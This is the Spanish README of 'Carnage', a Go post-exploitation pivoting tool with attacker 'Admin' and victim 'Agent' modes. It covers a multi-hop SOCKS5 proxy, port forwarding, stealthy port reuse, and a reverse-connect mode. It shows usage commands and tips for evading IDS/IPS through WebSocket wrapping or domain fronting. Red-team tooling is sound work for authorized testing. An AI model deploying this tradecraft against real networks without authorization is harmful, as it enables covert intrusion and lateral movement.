# Carnage

Proxy multi-salto SOCKS5 + port forwarding + port reuse para pruebas de penetración. Modo Admin/Agent, comunicaciones TLS 1.3 + AES-GCM, y compilación a un solo binario estático multiplataforma (Linux, Windows, macOS, ARM y MIPS para routers). Escrito en Go.

> ⚠️ **Aviso legal:** Carnage está diseñado exclusivamente para pruebas de penetración **autorizadas** y entornos controlados. El uso no autorizado sobre sistemas ajenos es ilegal. El autor no se hace responsable del mal uso.

---

## Características

- **Proxy SOCKS5 multi-salto:** encadena nodos (A → B → C) para alcanzar redes internas.
- **Port Forwarding:** redirige un puerto local a un destino interno (ej. `13389 → 3389`).
- **Port Reuse:** comparte un puerto ya abierto (`SO_REUSEPORT`) para mayor sigilo.
- **Modo Admin/Agent:** el Admin (atacante) se conecta al Agent (víctima) o viceversa.
- **Comunicaciones seguras:** handshake con TLS 1.3 (parece HTTPS) y cifrado simétrico AES-GCM para los mensajes.
- **Protocolo binario propio:** `[1 byte tipo][4 bytes longitud][payload]` definido en `pkg/protocol`.
- **Compilación estática:** `CGO_ENABLED=0`, sin dependencias externas, multiplataforma.
- **CLI con Cobra:** subcomandos y flags claros para cada operación.

---

## Requisitos

- Go **1.22** o superior.
- (Opcional) `make` para usar el `Makefile`.
- (Opcional) `goreleaser` si quieres automatizar releases.

---

## Instalación y compilación

```bash
git clone https://github.com/Falconmx1/Carnage.git
cd Carnage
go mod tidy

# Compilación local
go build -ldflags="-s -w" -o carnage ./cmd/carnage

# O con Makefile
make build

Compilación multiplataforma

# Linux AMD64 / ARM64
make linux

# Linux ARMv7 (routers)
make arm

# Linux MIPS / MIPSLE (routers)
make mips

# Windows AMD64
make windows

# macOS AMD64 / ARM64 (Apple Silicon)
make darwin

# O todos los binarios con el script
./scripts/build.sh v1.0.0
Los binarios quedan en dist/.

Uso rápido
1. Agent (víctima) a la escucha

# Escucha en el puerto 443 con TLS 1.3 + AES
./carnage agent listen --port 443
Salida esperada:

text
[+] Agent escuchando en 0.0.0.0:443 (TLS 1.3)
2. Admin (atacante) se conecta al Agent

./carnage admin connect --agent-ip 1.2.3.4 --agent-port 443
Salida esperada:

text
[+] Conexión establecida con el Agent 1.2.3.4:443
[+] Respuesta (N bytes): ...
[+] Sesión activa. Ctrl+C para salir.
3. Modo inverso: el Agent se conecta al Admin

# En el Admin: escuchar conexiones entrantes
./carnage admin listen --listen 0.0.0.0:443

# En el Agent: conectar al Admin
./carnage agent connect --admin-ip 1.2.3.4 --admin-port 443
4. Cadena SOCKS5 multi-salto

./carnage admin chain \
  --nodes "socks5://nodoA:1080,socks5://nodoB:1080,socks5://nodoC:1080" \
  --listen 127.0.0.1:1080 \
  --target 10.0.0.5:3389
El tráfico entra por 127.0.0.1:1080, pasa por A → B → C y sale hacia 10.0.0.5:3389 en la red interna.

5. Port Forwarding

./carnage admin forward --listen-port 13389 --target 127.0.0.1:3389
Ahora 127.0.0.1:13389 en tu máquina apunta al RDP interno 127.0.0.1:3389.

6. Port Reuse (SO_REUSEPORT)

./carnage admin reuse --reuse-addr 0.0.0.0:80 --target 127.0.0.1:3389
Comparte el puerto 80 con un Apache/Nginx ya abierto (solo Linux/Unix) y redirige el tráfico al destino interno.

Comando                Flags                                 Descripción
admin connect          --agent-ip, --agent-port              Conecta al Agent con TLS + AES.
admin listen           --listen                              Escucha conexiones entrantes de Agents.
admin chain            --nodes, --listen, --target           Cadena SOCKS5 multi-salto.
admin forward          --listen-port, --target               Port forwarding TCP.
admin reuse            --reuse-addr, --target                Port reuse con SO_REUSEPORT.
agent listen           --port                                Escucha conexiones del Admin.
agent connect          --admin-ip, --admin-port              Conecta al Admin (modo inverso).

Cómo funciona el protocolo
Cada mensaje viaja así:
[1 byte tipo][4 bytes longitud big-endian][payload cifrado con AES-GCM]

Los tipos definidos en pkg/protocol son:
Tipo                Valor                Uso
HANDSHAKE           0x01                 Saludo inicial Admin → Agent
HANDSHAKE_OK        0x02                 Confirmación Agent → Admin
COMMAND             0x03                 Comando del Admin al Agent
COMMAND_RESULT      0x04                 Resultado del Agent al Admin
DATA                0x05                 Datos crudos (túneles)
CLOSE               0x06                 Cierre ordenado
PING                0x07                 Keep-alive
PONG                0x08                 Respuesta al ping

El handshake de seguridad es:

1. TLS 1.3 (parece HTTPS legítimo, con certificado autofirmado generado al vuelo).

2. Intercambio de un secreto de 32 bytes.

3. Derivación de clave AES-256 con SHA-256.

4. Todos los mensajes posteriores van cifrados con AES-GCM.

Notas de seguridad
Certificados: el Agent genera un certificado autofirmado al arrancar. El Admin usa InsecureSkipVerify para aceptarlo. En un entorno real, conviene pinnear el certificado del Agent o usar una CA propia.

IDS/IPS: aunque el tráfico va por TLS, el patrón de handshake personalizado puede ser detectado. Para mayor sigilo, considera envolver el protocolo en WebSocket sobre TLS o aplicar domain fronting.

Port Reuse: SO_REUSEPORT solo funciona en Linux/Unix. En Windows el listener cae a modo normal.

Uso ético: úsalo solo con permiso explícito por escrito.
